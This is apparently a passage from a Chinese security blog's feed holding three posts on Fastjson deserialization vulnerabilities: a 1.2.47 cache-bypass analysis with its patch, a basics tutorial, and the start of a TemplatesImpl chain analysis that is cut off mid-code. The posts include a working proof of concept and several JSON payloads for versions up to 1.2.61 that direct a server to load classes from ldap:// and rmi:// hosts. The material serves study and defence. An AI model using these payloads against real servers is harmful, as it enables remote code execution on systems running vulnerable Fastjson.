<p>然后找哪个地方调用了<code>loadClass</code>方法，找到的可利用方法为<code>MiscCodec#deserialze</code></p>
<p>在clazz等于Class.class的情况下，会调用<code>loadClass</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个<code>**MiscCodec**</code>是什么呢，它继承了<code>ObjectSerializer</code>与<code>ObjectDeserializer</code>，是一个序列化&#x2F;反序列化器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MiscCodec</span> <span class="keyword">implements</span> <span class="title class_">ObjectSerializer</span>, ObjectDeserializer </span><br></pre></td></tr></table></figure>

<p>在<code>DefaultJSONParser#parseObject</code>进行反序列化的时候，使用的是<code>JavaBeanDeserializer</code>反序列化器</p>
<p>但是这个反序列化器，我们可以看到，是从<code>config</code>找到的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz);</span><br><span class="line">            <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                instance = ((JavaBeanDeserializer) deserializer).createInstance(<span class="built_in">this</span>, clazz);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                                instance = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.util.Collections$EmptyMap&quot;</span>.equals(typeName)) &#123;</span><br><span class="line">                                instance = Collections.emptyMap();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                instance = clazz.newInstance();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>在进行初始化的时候，它会把对应类所对应的反序列化器放进去</p>
<p>其中很多都用的是<code>MiscCodec</code>的反序列化器，Class.class就是它</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">ParserConfig</span><span class="params">(ASMDeserializerFactory asmFactory, ClassLoader parentClassLoader)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (asmFactory == <span class="literal">null</span> &amp;&amp; !ASMUtils.IS_ANDROID) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parentClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                    asmFactory = <span class="keyword">new</span> <span class="title class_">ASMDeserializerFactory</span>(<span class="keyword">new</span> <span class="title class_">ASMClassLoader</span>());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    asmFactory = <span class="keyword">new</span> <span class="title class_">ASMDeserializerFactory</span>(parentClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExceptionInInitializerError error) &#123;</span><br><span class="line">                <span class="comment">// skip</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (AccessControlException error) &#123;</span><br><span class="line">                <span class="comment">// skip</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoClassDefFoundError error) &#123;</span><br><span class="line">                <span class="comment">// skip</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.asmFactory = asmFactory;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (asmFactory == <span class="literal">null</span>) &#123;</span><br><span class="line">            asmEnable = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        deserializers.put(SimpleDateFormat.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(java.sql.Timestamp.class, SqlDateDeserializer.instance_timestamp);</span><br><span class="line">        deserializers.put(java.sql.Date.class, SqlDateDeserializer.instance);</span><br><span class="line">        deserializers.put(java.sql.Time.class, TimeDeserializer.instance);</span><br><span class="line">        deserializers.put(java.util.Date.class, DateCodec.instance);</span><br><span class="line">        deserializers.put(Calendar.class, CalendarCodec.instance);</span><br><span class="line">        deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(JSONObject.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(JSONArray.class, CollectionCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Map.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(HashMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(LinkedHashMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(TreeMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(ConcurrentMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Collection.class, CollectionCodec.instance);</span><br><span class="line">        deserializers.put(List.class, CollectionCodec.instance);</span><br><span class="line">        deserializers.put(ArrayList.class, CollectionCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Object.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(String.class, StringCodec.instance);</span><br><span class="line">        deserializers.put(StringBuffer.class, StringCodec.instance);</span><br><span class="line">        deserializers.put(StringBuilder.class, StringCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">char</span>.class, CharacterCodec.instance);</span><br><span class="line">        deserializers.put(Character.class, CharacterCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">byte</span>.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(Byte.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(<span class="type">short</span>.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(Short.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(<span class="type">int</span>.class, IntegerCodec.instance);</span><br><span class="line">        deserializers.put(Integer.class, IntegerCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">long</span>.class, LongCodec.instance);</span><br><span class="line">        deserializers.put(Long.class, LongCodec.instance);</span><br><span class="line">        deserializers.put(BigInteger.class, BigIntegerCodec.instance);</span><br><span class="line">        deserializers.put(BigDecimal.class, BigDecimalCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">float</span>.class, FloatCodec.instance);</span><br><span class="line">        deserializers.put(Float.class, FloatCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">double</span>.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(Double.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(<span class="type">boolean</span>.class, BooleanCodec.instance);</span><br><span class="line">        deserializers.put(Boolean.class, BooleanCodec.instance);</span><br><span class="line">        deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">char</span>[].class, <span class="keyword">new</span> <span class="title class_">CharArrayCodec</span>());</span><br><span class="line"></span><br><span class="line">        deserializers.put(AtomicBoolean.class, BooleanCodec.instance);</span><br><span class="line">        deserializers.put(AtomicInteger.class, IntegerCodec.instance);</span><br><span class="line">        deserializers.put(AtomicLong.class, LongCodec.instance);</span><br><span class="line">        deserializers.put(AtomicReference.class, ReferenceCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(WeakReference.class, ReferenceCodec.instance);</span><br><span class="line">        deserializers.put(SoftReference.class, ReferenceCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(UUID.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(TimeZone.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Locale.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Currency.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(InetAddress.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Inet4Address.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Inet6Address.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(InetSocketAddress.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(File.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(URI.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(URL.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Pattern.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Charset.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(JSONPath.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Number.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);</span><br><span class="line">        deserializers.put(AtomicLongArray.class, AtomicCodec.instance);</span><br><span class="line">        deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Serializable.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(Comparable.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(Closeable.class, JavaObjectDeserializer.instance);</span><br><span class="line"></span><br><span class="line">        addItemsToDeny(DENYS);</span><br><span class="line">        addItemsToAccept(AUTO_TYPE_ACCEPT_LIST);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里这个流程就走完了，我们加载<code>Class.class</code>，使用<code>MiscCodec</code>反序列化器，调用<code>loadClass</code>，将类名传入，并放入缓冲区中</p>
<p>当我们再次对类进行加载的时候，就直接从缓存中返回类</p>
<h3 id="YoAWe">实现</h3>
第一步 反序列化一个Class类，值为恶意类

<p>第二步 接着用之前的payload</p>
<p>加载第一个Class类时候设置类为Class类，后面的参数名就叫<code>val</code>即可，若不为它就会报错</p>
<p>第二个类直接使用之前payload即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson1227</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/KemDnGOe\&quot;,\&quot;autoCommit\&quot;:false&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后成功加载恶意类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737119364990-83c943df-7792-4805-9c0e-0ce6476027c5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737119364990-83c943df-7792-4805-9c0e-0ce6476027c5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="rgAg9">补丁分析</h3>
由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，我们看看是怎样修的

<p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.2.47</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1.2.48</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="wpn7g">Fastjson <= 1.2.61 通杀</h2>
<h3 id="wndOB">Fastjson1.2.5 <= 1.2.59</h3>

<ul>
<li>需要开启AutoType</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ozmxv">Fastjson1.2.5 <= 1.2.60</h3>

<ul>
<li>需要开启AutoType</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="string">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="string">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="dLpkB">Fastjson1.2.5 <= 1.2.60</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson基础</title>
    <url>/2025/03/10/FastJson%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="lXrTl">FastJson基础</h1>
<h2 id="hQtoG">FastJson 简介</h2>

<p><font style="color:rgb(80, 80, 92);">Fastjson 是 Alibaba 开发的 Java 语言编写的高性能 JSON 库，用于将数据在 JSON 和 Java Object 之间互相转换。</font></p>
<p><font style="color:rgb(80, 80, 92);">提供两个主要接口来分别实现序列化和反序列化操作。</font></p>
<p><code>JSON.toJSONString</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">将 Java 对象转换为 json 对象，序列化的过程。</font></p>
<p><code>JSON.parseObject/JSON.parse</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">将 json 对象重新变回 Java 对象；反序列化的过程</font></p>
<ul>
<li>所以可以简单的把 json 理解成是一个字符串</li>
</ul>
<h2 id="af4tf">环境配置</h2>

<ul>
<li>JDK7u21</li>
<li>Fastjson 1.2.24</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="JGHVL">简单小demo</h2>

<p>定义一个<code>Person</code>类，为其设置setter&#x2F;getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="aQ7yy">序列化</h3>

<p>写一个序列化的代码，调用<code>JSON.toJsonStirng()</code>来序列化<code>Person</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setAge(<span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741581603504-58ed2f84-07a8-4a8c-9c0d-4401d51a7592.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741581603504-58ed2f84-07a8-4a8c-9c0d-4401d51a7592.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="mvgXU">反序列化</h3>

<p>写一个反序列化的代码，调用<code>JSONObject.parseObject()</code>来反序列化<code>Person</code>对象</p>
<p>（当需要还原出private的属性时，需要在JSON.parseObject&#x2F;JSON.parse中加上Feature.SupportNonPublicField参，当然一般没人给私有属性加setter）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741582884850-efa7c14e-964b-4ed5-80b9-b62066959094.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741582884850-efa7c14e-964b-4ed5-80b9-b62066959094.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="cVjXD">小知识</h4>
Fastjson反序列化采用两个反序列化方法，分别为

<ul>
<li><code>JSON.parseObject()</code></li>
<li><code>JSON.parse()</code></li>
</ul>
<p><code>parseObject()</code>：返回<code>fastjsonJSONObject</code>类</p>
<p><code>parse()</code>：返回我们的类</p>
<p>下面我们可以看到，<code>parseObject()</code>返回<font style="color:rgb(80, 80, 92);">parseObject类，而</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;parse()&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">返回我们的User类</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740451295154-af89d742-b770-477e-a8d1-62c93c168bab.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740451295154-af89d742-b770-477e-a8d1-62c93c168bab.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>但是可以通过在parseObject参数中传入类，达到和parse相同效果（也可以传入Student.class）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">parseObject(input,Object.class)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740451464436-ea6fe816-0714-4966-bb29-c00b3f4cc149.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740451464436-ea6fe816-0714-4966-bb29-c00b3f4cc149.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="l8PMW">Fastjson反序列化漏洞</h2>

<p>fastjson在反序列化字符串时，会寻找<code>@type</code>中的类，在反序列化过程中会自动调用该类的setter和getter方法，但并不是所有getter和setter都会被调用</p>
<p>以下是满足条件的setter和getter的条件（可以根据源码分析出来，这里不多说了）：</p>
<p><strong>满足条件的setter</strong></p>
<ul>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p><strong>满足条件的getter</strong></p>
<ul>
<li>非静态方法</li>
<li>无参数</li>
<li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li>
</ul>
<h3 id="Z1BNv">漏洞原理</h3>
Fastjson拥有自己的一套实现序列化和反序列化的机制，针对不同版本的Fastjson反序列化漏洞，原理都是一样的，只是针对不同黑名单的绕过利用

<p>攻击者传入一个恶意构造的JSON字符串，Fastjson在反序列化字符串时，得到恶意类并执行恶意类的恶意函数，导致恶意代码执行</p>
<p>我们看之前的代码Demo，他会调用该类的 构造方法、getter、setter方法，若这些方法中存在危险方法的话，即存在Fastjson的 反序列化漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741583089073-ac0818a6-f11f-4dfb-8a08-5a00b0f4b02a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741583089073-ac0818a6-f11f-4dfb-8a08-5a00b0f4b02a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="mwThh">POC写法</h3>
一般Fastjson反序列化的POC写法如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;xxx.xxx.xxx&quot;</span>,</span><br><span class="line"><span class="string">&quot;xxx&quot;</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="olZbj">小结</h2>
在学习过程中，发现fastjson的好多东西都没学到，回来重新学习一下，前两天有点忙，所以博客没来得及更新QAQ]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson1.2.24</title>
    <url>/2025/03/11/Fastjson1-2-24/</url>
    <content><![CDATA[<h1 id="vVnol">Fastjson-1.2.24</h1>
<h2 id="W7xMF">环境</h2>

<ul>
<li>JDK8u65</li>
<li>1.2.22 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.24</li>
</ul>
<p>pom.xml 文件导入如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="gQL0k">出网情况下</h2>
<h3 id="pKHDE">基于TemplatesImpl的利用链</h3>
<h4 id="zPmNk">分析</h4>

<p>我们一定对TemplatesImpl有所了解，学习CC链时，就有它的身影，我们使用它的<code>getTransletInstance</code>方法去加载任意类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span 